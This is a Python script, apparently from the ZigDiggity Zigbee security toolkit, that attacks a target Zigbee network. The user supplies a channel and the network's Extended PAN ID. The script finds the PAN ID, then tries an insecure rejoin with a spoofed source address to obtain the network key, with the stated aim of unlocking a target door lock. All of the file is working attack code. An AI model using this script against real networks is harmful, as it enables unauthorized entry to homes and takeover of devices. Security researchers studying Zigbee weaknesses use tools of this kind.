import os
import sys
sys.path.append(os.getcwd() + "/zigdiggity")

import time
import argparse
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *

from zigdiggity.radios.raspbee_radio import RaspbeeRadio
from zigdiggity.radios.observer_radio import ObserverRadio
from zigdiggity.observers.wireshark_observer import WiresharkObserver
import zigdiggity.crypto.utils as crypto_utils
from zigdiggity.misc.actions import *
from zigdiggity.interface.components.logo import Logo

parser = argparse.ArgumentParser(description='Attempt to unlock the target lock')
parser.add_argument('-c','--channel',action='store',type=int,dest='channel',required=True,help='Channel to use')
parser.add_argument('-e','--epan',action='store',type=lambda s: int(s.replace(':',''),16),dest='epan',required=True,help='The Extended PAN ID of the network to target')
parser.add_argument('-w','--wireshark',action='store_true',dest='wireshark',required=False,help='See all traffic in wireshark')
args = parser.parse_args()

logo = Logo()
logo.print()

hardware_radio = RaspbeeRadio("/dev/ttyS0")
radio = ObserverRadio(hardware_radio)

if args.wireshark:
    wireshark = WiresharkObserver()
    radio.add_observer(wireshark)

TARGET_EPAN = args.epan
CHANNELS = [args.channel]

start_time = time.time()
for channel in CHANNELS:

    radio.set_channel(channel)

    panid = get_pan_by_extended_pan(radio, TARGET_EPAN)
    if panid is None:
        print_error("Could not find the PAN ID corresponding to the target network.")
        exit(1)

    for attempt in range(3):
        key = insecure_rejoin_by_panid(radio, panid, extended_src=0x01020304050607)
        if key is not None:
            break

radio.off()
print_notify("Total elapsed time: %f seconds" % (time.time()-start_time))
